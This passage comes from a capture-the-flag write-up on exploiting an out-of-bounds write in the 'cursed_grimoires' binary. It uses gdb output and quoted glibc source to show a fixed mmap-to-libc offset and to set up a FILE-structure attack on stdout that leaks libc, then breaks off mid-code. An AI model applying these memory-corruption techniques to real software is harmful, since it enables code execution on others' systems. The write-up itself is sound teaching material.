<p>To summarize, some important notes that we have taken from our analysis:</p>
<ul>
<li>There are three menus that we can choose (<code>create</code>, <code>edit</code>, and <code>exit</code>).</li>
<li>We can allocate one chunk with any size that we want.</li>
<li>There is a bug in the <code>edit</code> method which leads us to OOB write on any address that we want (relative to our allocated chunk&rsquo;s address)</li>
</ul>
<h2 id="exploitation">Exploitation <a href="#exploitation" class="anchor">#</a></h2>
<p>Now, based on those important notes, we need to think about how to abuse the OOB bug that we found so that we can leverage it into Remote-Code-Execution (RCE). Up until now:</p>
<ul>
<li>Even though we have an OOB write, due to ASLR (address randomization), we don&rsquo;t know the exact address of our created chunk in the heap nor the offset difference between our targeted address with our chunk.</li>
</ul>
<h3 id="leveraging-the-oob-bug-with-malloc-behavior">Leveraging the OOB bug with <code>malloc</code> behavior <a href="#leveraging-the-oob-bug-with-malloc-behavior" class="anchor">#</a></h3>
<p>So, what should we do? Remember that in this binary, we are allowed to allocate a chunk of any size. Let&rsquo;s check the manuals of the malloc. Turns out, there are some interesting notes in the <code>man malloc</code> result.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>NOTES
</span></span><span style="display:flex;"><span>       By default, Linux follows an optimistic memory allocation strategy.  This means that when malloc() returns non-NULL there is no guarantee that the memory really is available.  In  case  it
</span></span><span style="display:flex;"><span>       turns  out  that  the  system  is  out  of  memory, one or more processes will be killed by the OOM killer.  For more information, see the description of /proc/sys/vm/overcommit_memory and
</span></span><span style="display:flex;"><span>       /proc/sys/vm/oom_adj in proc(5), and the Linux kernel source file Documentation/vm/overcommit-accounting.rst.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2).  When allocating blocks of memory  larger  than  MMAP_THRESHOLD  bytes,  the
</span></span><span style="display:flex;"><span>       glibc  malloc()  implementation allocates the memory as a private anonymous mapping using mmap(2).
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the notes, if we call <code>malloc()</code> with a big size, it will place our chunk in the mmapped page rather than the heap area. And reading through this <a href="https://github.com/LMS57/Nightmare-Writeup" target="_blank" rel="noopener">article</a> that I found, we can learn that a new page created by <code>mmap</code> will have a consistent offset difference from the libc starting area address. To prove this, let&rsquo;s fire up our <code>gdb</code> to run the binary multiple time and test it by allocating a chunk with size <code>1000000</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/gx &amp;GRIMOIRE
</span></span><span style="display:flex;"><span>0x55e0067dd030 &lt;GRIMOIRE&gt;:      0x00007f3b78939010
</span></span><span style="display:flex;"><span>gef➤  vmmap
</span></span><span style="display:flex;"><span>[ Legend:  Code | Heap | Stack ]
</span></span><span style="display:flex;"><span>Start              End                Offset             Perm Path
</span></span><span style="display:flex;"><span>0x000055e0067d9000 0x000055e0067da000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055e0067da000 0x000055e0067db000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055e0067db000 0x000055e0067dc000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055e0067dc000 0x000055e0067dd000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055e0067dd000 0x000055e0067de000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055e0067de000 0x000055e0067df000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055e007bc6000 0x000055e007be7000 0x0000000000000000 rw- [heap]
</span></span><span style="display:flex;"><span>0x00007f3b78939000 0x00007f3b78a31000 0x0000000000000000 rw-
</span></span><span style="display:flex;"><span>0x00007f3b78a31000 0x00007f3b78a59000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the chunk was placed not in the heap, but in a new page created by the mmap, and it was placed just before the <code>libc</code> (The offset difference is <code>0x00007f3b78a31000 - 0x00007f3b78939010 = 0xf7ff0</code>). Let&rsquo;s try to run it one more time to confirm it.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/gx &amp;GRIMOIRE
</span></span><span style="display:flex;"><span>0x555555558030 &lt;GRIMOIRE&gt;:      0x00007ffff7c9c010
</span></span><span style="display:flex;"><span>gef➤  vmmap
</span></span><span style="display:flex;"><span>[ Legend:  Code | Heap | Stack ]
</span></span><span style="display:flex;"><span>Start              End                Offset             Perm Path
</span></span><span style="display:flex;"><span>0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x0000555555559000 0x000055555555a000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span style="display:flex;"><span>0x000055555555a000 0x000055555557b000 0x0000000000000000 rw- [heap]
</span></span><span style="display:flex;"><span>0x00007ffff7c9c000 0x00007ffff7d94000 0x0000000000000000 rw-
</span></span><span style="display:flex;"><span>0x00007ffff7d94000 0x00007ffff7dbc000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
</span></span></code></pre></td></tr></table>
</div>
</div><p>Yup, we can confirm that when we allocated a big chunk, the <code>libc_base_address</code> will be at <code>chunk_address + 0xf7ff0</code>. With this piece of information, now that we can leverage our <code>OOB</code> bug to be able to overwrite any value stored in the <code>libc</code> area by setting the index to <code>0xf7ff0 + libc_target_offset</code>.</p>
<h3 id="getting-a-libc-leak">Getting a libc leak <a href="#getting-a-libc-leak" class="anchor">#</a></h3>
<p>Now that we have the power to overwrite any writeable area in the loaded libc, what should we do now? Remember that up until now, we don&rsquo;t have any libc address leak yet. So, it would be a good idea to try finding a way on getting the libc leak.</p>
<p>One of the ways that I could think of is using a FILE Structure Attack. If you don&rsquo;t have any idea or this is your first time hearing about it, I had written some basic knowledge about it in <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/" target="_blank" rel="noopener">one of my blog&rsquo;s articles</a>. I believe that reading through that article first will give you a strong fundamental to understand the exploit for this challenge.</p>
<p>One of the tricks related to FILE Structure Attack that we could do to leak the libc address is based on this <a href="https://vigneshsrao.github.io/posts/babytcache/" target="_blank" rel="noopener">article</a>. The article explained the trick on leaking the libc, but I will try to break it down one by one again based on what I did to understand the article.</p>
<p>Remember that the <code>menu()</code> function will be called on each iteration and it calls <code>puts</code>. So, based on the previous article, if we deep dive into the implementation of <code>puts</code> in the glibc source code, we will get a way to get a libc leak.</p>
<p>Let&rsquo;s start breaking it down one by one starting from the <code>puts</code> method itself.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span>
</span></span><span style="display:flex;"><span><span style="color:#c0f">_IO_puts</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>str)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> result <span style="color:#555">=</span> EOF;
</span></span><span style="display:flex;"><span>  size_t len <span style="color:#555">=</span> strlen (str);
</span></span><span style="display:flex;"><span>  _IO_acquire_lock (stdout);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((_IO_vtable_offset (stdout) <span style="color:#555">!=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>       <span style="color:#555">||</span> _IO_fwide (stdout, <span style="color:#555">-</span><span style="color:#f60">1</span>) <span style="color:#555">==</span> <span style="color:#555">-</span><span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#555">&amp;&amp;</span> _IO_sputn (stdout, str, len) <span style="color:#555">==</span> len
</span></span><span style="display:flex;"><span>      <span style="color:#555">&amp;&amp;</span> _IO_putc_unlocked (<span style="color:#c30">&#39;\n&#39;</span>, stdout) <span style="color:#555">!=</span> EOF)
</span></span><span style="display:flex;"><span>    result <span style="color:#555">=</span> MIN (INT_MAX, len <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  _IO_release_lock (stdout);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>weak_alias (_IO_puts, puts)
</span></span><span style="display:flex;"><span>libc_hidden_def (_IO_puts)
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>puts</code> is an alias to <code>_IO_puts</code>. As you can see, the <code>_IO_puts</code> will call <code>_IO_sputn (stdout, str, len)</code>, which based on this <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L379" target="_blank" rel="noopener">LOC</a> in the glibc source code, is an alias to <code>_IO_XSPUTN (__fp, __s, __n)</code>, which means it will jump to the stored pointer for <code>__xsputn</code> key in the <code>stdout</code> FILE.</p>
<p>Inspecting via GDB (or you can deep dive its source code as well), <code>stdout</code> vtable mapped the key <code>__xsputn</code> to the <code>_IO_new_file_xsputn</code> method.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  print _IO_2_1_stdout_
</span></span><span style="display:flex;"><span>$4 = {
</span></span><span style="display:flex;"><span>  file = {
</span></span><span style="display:flex;"><span>    _flags = 0xfbad2887,
</span></span><span style="display:flex;"><span>    _IO_read_ptr = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span style="display:flex;"><span>    _IO_read_end = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span style="display:flex;"><span>    _IO_read_base = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span style="display:flex;"><span>    _IO_write_base = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span style="display:flex;"><span>    _IO_write_ptr = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span style="display:flex;"><span>    _IO_write_end = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    _wide_data = 0x7ffff7fad9a0 &lt;_IO_wide_data_1&gt;,
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  vtable = 0x7ffff7faa600 &lt;__GI__IO_file_jumps&gt;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>gef➤  print __GI__IO_file_jumps
</span></span><span style="display:flex;"><span>$5 = {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  __overflow = 0x7ffff7e20e40 &lt;_IO_new_file_overflow&gt;,
</span></span><span style="display:flex;"><span>  __underflow = 0x7ffff7e20b30 &lt;_IO_new_file_underflow&gt;,
</span></span><span style="display:flex;"><span>  __uflow = 0x7ffff7e21de0 &lt;__GI__IO_default_uflow&gt;,
</span></span><span style="display:flex;"><span>  __pbackfail = 0x7ffff7e23300 &lt;__GI__IO_default_pbackfail&gt;,
</span></span><span style="display:flex;"><span>  __xsputn = 0x7ffff7e1f680 &lt;_IO_new_file_xsputn&gt;,
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  __write = 0x7ffff7e1ef40 &lt;_IO_new_file_write&gt;,
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>So now, let&rsquo;s check the code.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>size_t
</span></span><span style="display:flex;"><span><span style="color:#c0f">_IO_new_file_xsputn</span> (FILE <span style="color:#555">*</span>f, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>data, size_t n)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>s <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>) data;
</span></span><span style="display:flex;"><span>  size_t to_do <span style="color:#555">=</span> n;
